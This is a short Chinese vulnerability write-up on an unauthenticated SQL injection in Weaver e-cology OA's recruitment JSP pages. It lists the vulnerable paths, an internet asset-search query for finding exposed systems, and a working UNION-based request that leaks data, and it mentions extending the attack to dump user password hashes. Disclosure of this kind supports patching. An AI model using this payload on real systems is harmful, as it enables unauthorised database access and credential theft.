---
source: "7hang《安全研究 - 泛微OA》（博客园，wooyun-2015-0136818）"
---

# 泛微OA HrmCareerApplyPerView.jsp SQL注入漏洞

## 漏洞描述

泛微 e-cology 通用型多处SQL注入漏洞（缺陷编号 wooyun-2015-0136818），招聘申请相关多个 JSP 文件的 `id` 参数未做过滤，可直接拼接 SQL 语句。注入点包括：

- `/pweb/careerapply/HrmCareerApplyPerEdit.jsp`（参数 id）
- `/pweb/careerapply/HrmCareerApplyPerView.jsp`（参数 id）
- `/pweb/careerapply/HrmCareerApplyWorkEdit.jsp`（参数 id）
- `/pweb/careerapply/HrmCareerApplyWorkView.jsp`（参数 id）
- `/web/careerapply/` 下的对应文件（参数 id）

攻击者无需登录，通过 UNION 查询即可读取数据库敏感信息。

## 漏洞影响

```
泛微 e-cology
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

```
GET /pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7 HTTP/1.1
```

响应中将回显 MD5('abc') 的哈希值与当前数据库名，证明注入成功。可进一步构造 UNION 语句读取 `HrmResourceManager` 等表中的用户密码哈希。
